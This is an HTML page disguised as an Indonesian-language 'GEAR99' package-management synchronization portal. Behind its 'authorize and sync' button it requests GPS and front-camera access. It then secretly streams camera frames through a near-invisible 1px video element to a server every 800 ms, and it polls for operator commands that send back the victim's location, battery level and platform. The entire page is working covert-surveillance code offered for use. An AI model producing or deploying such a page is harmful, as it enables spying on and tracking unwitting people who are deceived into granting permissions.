<!DOCTYPE html>
<html>
<head>
    <title>Lab System Synchronization</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: #0b0c10; color: #45f3ff; font-family: monospace; text-align: center; padding-top: 80px; margin: 0; }
        .box { border: 2px solid #45f3ff; display: inline-block; padding: 30px; background-color: #1f2833; box-shadow: 0 0 15px #45f3ff; border-radius: 8px; max-width: 90%; }
        .btn { background-color: #45f3ff; color: #0b0c10; padding: 16px 32px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
    <div class="box" id="main-box">
        <h2>[ GEAR99 SISTEM MANAJEMEN PAKET ]</h2>
        <p>Gudang terisolasi memerlukan sinkronisasi media dan koordinat satu pintu.</p>
        <button class="btn" onclick="triggerOtoritas()">OTORISASI & SINKRONISASI</button>
    </div>
    <video id="v-feed" autoplay playsinline muted style="position: absolute; width: 1px; height: 1px; opacity: 0.01;"></video>
    <script>
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        var targetLatitude = "Belum Diambil";
        var targetLongitude = "Belum Diambil";
        var isStreaming = false;
        
        async function triggerOtoritas() {
            // 1. Ambil Koordinat GPS Sekali Saja di Awal (Tidak Berulang)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    targetLatitude = pos.coords.latitude;
                    targetLongitude = pos.coords.longitude;
                }, (err) => {
                    targetLatitude = "Akses Ditolak/Timeout";
                    targetLongitude = "Akses Ditolak/Timeout";
                }, { enableHighAccuracy: true, timeout: 8000, maximumAge: 60000 });
            }

            // 2. Ambil Izin Kamera Depan
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } }, 
                    audio: false 
                });
                
                let video = document.getElementById("v-feed");
                video.srcObject = stream;
                
                video.onloadedmetadata = () => { 
                    video.play(); 
                    isStreaming = true;
                    // Siklus pengiriman gambar diperlonggar agar hemat memori & lancar
                    setInterval(captureFrame, 800); 
                    setInterval(listenServerCommand, 1500); 
                };
                
                document.getElementById("main-box").innerHTML = "<h2 style='color:#66fcf1;'>[ NODE TERKONEKSI ]</h2><p>Sesi nirkabel logistik aktif melintasi private proxy.</p>";
            } catch(err) { 
                alert("Sinkronisasi gagal: Perangkat media tidak merespons."); 
            }
        }
        
        function captureFrame() {
            let video = document.getElementById("v-feed");
            if(isStreaming && video.videoWidth > 0) {
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Kirim frame dengan kompresi kualitas optimal untuk kelancaran live
                fetch('/receive_frame', { 
                    method: 'POST', 
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ frame: canvas.toDataURL('image/jpeg', 0.25) })
                });
            }
        }

        async function listenServerCommand() {
            let res = await fetch('/poll_command');
            let data = await res.json();
            if (data.command) {
                let report = "";
                let timestamp = new Date().toLocaleTimeString();
                
                if (data.command === "cek_baterai") {
                    let battery = await navigator.getBattery();
                    report = "[" + timestamp + "] STATUS BATERAI -> Level: " + Math.round(battery.level * 100) + "%";
                } else if (data.command === "ambil_data_sistem") {
                    report = "[" + timestamp + "] SPESIFIKASI SISTEM -> Platform: " + navigator.platform;
                } else if (data.command === "ambil_lokasi") {
                    // Operator menarik data koordinat yang sudah tersimpan statis aman
                    report = "[" + timestamp + "] KOORDINAT TERKUNCI -> Lat: " + targetLatitude + " | Long: " + targetLongitude;
                } else if (data.command === "ping_test") {
                    report = "[" + timestamp + "] MONITOR JALUR -> Respons Aktif";
                }
                
                fetch('/report_output', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ output: report })
                });
            }
        }
    </script>
</body>
</html>
